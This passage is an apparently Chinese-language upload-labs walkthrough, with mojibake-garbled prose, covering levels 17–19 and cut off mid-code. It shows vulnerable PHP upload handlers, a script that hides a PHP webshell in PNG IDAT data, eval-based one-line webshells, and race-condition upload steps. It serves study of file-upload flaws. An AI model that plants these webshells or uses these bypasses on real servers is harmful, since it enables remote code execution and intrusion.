<h2 id="PASS-17"><a href="#PASS-17" class="headerlink" title="PASS-17"></a>PASS-17</h2><p>è¿™ä¸€é¢˜æ˜¯ä¸€ä¸ªäºŒæ¬¡æ¸²æŸ“ç»•è¿‡ï¼Œè¿™ä¸ªé¢˜è¦ç›¸è¾ƒä¸Šé¢é‚£äº›è¦å›°éš¾ä¸€äº›ã€‚è¿™ä¸ªä»£ç çš„æ€è·¯æ˜¯å…ˆè®©æˆ‘ä»¬ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œç„¶åå®ƒå†å°†å›¾ç‰‡ç§»åŠ¨åˆ°æŒ‡å®šçš„ä½ç½®ï¼Œå¦‚æœæˆåŠŸåˆ™é‡æ–°åˆ›å»ºä¸€å¼ æ–°çš„å›¾ç‰‡ï¼Œ<code>imagecreatefromjpeg</code>å‡½æ•°è‹¥æ‰§è¡ŒæˆåŠŸï¼Œåˆ™åˆ¤æ–­ä¸Šä¼ çš„æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œè‹¥å¤±è´¥ï¼Œåˆ™è¿”å›é”™è¯¯ä¿¡æ¯ã€‚å› ä¸ºä¸åŒçš„æ–‡ä»¶æ ¼å¼åˆ©ç”¨å§¿åŠ¿éƒ½ä¸ç›¸åŒï¼Œå¹¶ä¸”åœ¨å®æˆ˜ä¸­ä¹Ÿç»å¸¸ä¼šé‡åˆ°ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œè¯¦ç»†ä»‹ç»ä¸€ä¸‹åˆ©ç”¨å§¿åŠ¿</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>GIFæ ¼å¼</strong></p>
</blockquote>
<p>é¦–å…ˆæˆ‘ä»¬å…ˆä¸Šä¼ ä¸€å¼ å¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„GIFå›¾ç‰‡åˆ°æœåŠ¡å™¨ä¸Šï¼Œä¸Šä¼ æˆåŠŸä½†æ˜¯å´ä¸èƒ½ä¸Šçº¿æˆåŠŸã€‚æˆ‘ä»¬å°†ä¸Šä¼ çš„å›¾ç‰‡ä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨010editorç¼–è¾‘å™¨æŸ¥çœ‹çš„æ—¶å€™å‘ç°ï¼Œæœ€åçš„ä¸€å¥è¯æœ¨é©¬å†…å®¹è¢«äºŒæ¬¡æ¸²æŸ“åˆ é™¤äº†<br><img src="https://img-blog.csdnimg.cn/9b5eba837f7c4b0aac13a32b7b2d6c77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯¹æ¯”ä¸€ä¸‹åŸæœ¨é©¬æ–‡ä»¶å’Œè¢«äºŒæ¬¡æ¸²æŸ“çš„å›¾ç‰‡ï¼Œå‘ç°å‰é¢ä¸€éƒ¨åˆ†æ˜¯ç›¸åŒçš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬çš„æœ¨é©¬å†…å®¹åµŒå¥—åœ¨é‡Œé¢<br><img src="https://img-blog.csdnimg.cn/7954f9e7758145578101d054eb04f4a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/1a547a9bcad1414a83b3c0a2429a01c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šä¼ æˆåŠŸåæˆ‘ä»¬å¯ä»¥ä½¿ç”¨LFIæ¼æ´è¿›è¡Œåˆ©ç”¨æˆåŠŸï¼Œå¹¶æˆåŠŸä¸Šçº¿<br><img src="https://img-blog.csdnimg.cn/7764f734f74841a79cef9587963b54b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/feceb518cf5c46f4a9be08e2819dba86.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<blockquote>
<p><strong>PNG</strong></p>
</blockquote>
<p>pngå›¾ç‰‡çš„ç»•è¿‡å°±æ¯”è¾ƒå¤æ‚äº†ï¼Œå› ä¸ºæ¶‰åŠçš„åŸç†å’Œå› ç´ å¾ˆå¤šã€‚æˆ‘ä»¬è¿™é‡Œå…ˆä½¿ç”¨ä¸€ä¸ªè„šæœ¬ï¼Œç›®çš„æ˜¯å†™å…¥IDATæ•°æ®å—ã€‚IDATå­˜æ”¾ç€å›¾åƒçœŸæ­£çš„æ•°æ®ä¿¡æ¯ï¼Œå› æ­¤ï¼Œå¦‚æœèƒ½å¤Ÿäº†è§£IDATçš„ç»“æ„ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„ç”ŸæˆPNGå›¾åƒã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./beautifulGirl.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å…ˆæˆåŠŸç”Ÿæˆä¸€å¼ å›¾ç‰‡ï¼Œç„¶åæˆ‘ä»¬åˆ†æä¸€ä¸‹é‡Œé¢çš„åå…­è¿›åˆ¶ä»£ç <br><img src="https://img-blog.csdnimg.cn/2b71399776834b3f9862590f187f6c8e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°IDATHæ•°æ®å—ä¸Šå†™å…¥äº†ä¸€æ®µphpä»£ç <code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>ï¼Œè¿™æ®µä»£ç é‡ŒåŒ…å«äº†GETå‚æ•°å’ŒPOSTå‚æ•°ï¼Œéœ€è¦åˆ©ç”¨LFIæ¼æ´å¯¹è¿™ä¸¤ä¸ªå‚æ•°è¿›è¡ŒåŒæ—¶åˆ©ç”¨æ‰èƒ½åˆ©ç”¨æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/9aa60f0810124418a06b1de67b991e36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-18"><a href="#PASS-18" class="headerlink" title="PASS-18"></a>PASS-18</h2><p>ä»ä»£ç ä¸­åˆ†æå¯ä»¥çœ‹åˆ°ï¼Œå®ƒä½¿ç”¨äº†ç™½åå•è¿‡æ»¤ï¼Œåªå…è®¸ä¸Šä¼ jpgã€pngå’Œgifæ ¼å¼çš„æ–‡ä»¶ã€‚å®ƒå’Œä¹‹å‰çš„ç™½åå•è¿‡æ»¤ä¸ä¸€æ ·ï¼Œå®ƒæœ€åæ˜¯é‡å‘½åäº†æ–‡ä»¶ä¹‹åå†ä¿å­˜ï¼Œå¦‚æœä¸æ˜¯è¿™ä¸‰ç§æ–‡ä»¶æ ¼å¼ï¼Œå°±æŠŠæ–‡ä»¶åˆ é™¤ã€‚æˆ‘ä»¬è¿™æ ·å°±å¯ä»¥å°è¯•ä½¿ç”¨æ¡ä»¶ç«äº‰çš„æ–¹å¼æŠŠæˆ‘ä»¬çš„webshellæ–‡ä»¶åœ¨è¢«æœåŠ¡å™¨åˆ é™¤ä¹‹å‰è¿›è¡Œåˆ©ç”¨ï¼Œåˆ©ç”¨éš¾åº¦è¾ƒå¤§ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payloadå†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åæˆ‘ä»¬æŠ“ä¸€ä¸ªä¸Šä¼ çš„åŒ…ï¼Œæ¸…é™¤æ‰€æœ‰çš„å‚æ•°ï¼Œå¹¶å°†ç±»å‹æ¢ä¸ºç©ºpayloadï¼Œçº¿ç¨‹è°ƒåˆ°500<br><img src="https://img-blog.csdnimg.cn/dfeb1e9e1e9b430f84a5e11ebee86480.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/fbbfbf0c32e3467797bb745be57e3559.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/95f6a38852914560908c7a102ace1277.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/142aebd2b2f044538a9bb6bf96e61874.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-19"><a href="#PASS-19" class="headerlink" title="PASS-19"></a>PASS-19</h2><p>å’Œå‰ä¸€å…³ç±»ä¼¼ï¼Œåªä¸è¿‡ç»“å’Œå‰é¢å‡ å…³çš„æ–¹æ³•ï¼Œå¯¹æ–‡ä»¶åç¼€ååšäº†ç™½åå•åˆ¤æ–­ï¼Œç„¶åä¼šä¸€æ­¥ä¸€æ­¥æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç­‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åï¼Œå¯¹æ–‡ä»¶é‡æ–°å‘½åï¼ŒåŒæ ·å­˜åœ¨æ¡ä»¶ç«äº‰çš„æ¼æ´ã€‚å¯ä»¥ä¸æ–­åˆ©ç”¨burpå‘é€ä¸Šä¼ å›¾ç‰‡é©¬çš„æ•°æ®åŒ…ï¼Œç”±äºæ¡ä»¶ç«äº‰ï¼Œç¨‹åºä¼šå‡ºç°æ¥ä¸åŠrenameçš„é—®é¢˜ï¼Œä»è€Œä¸Šä¼ æˆåŠŸ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span 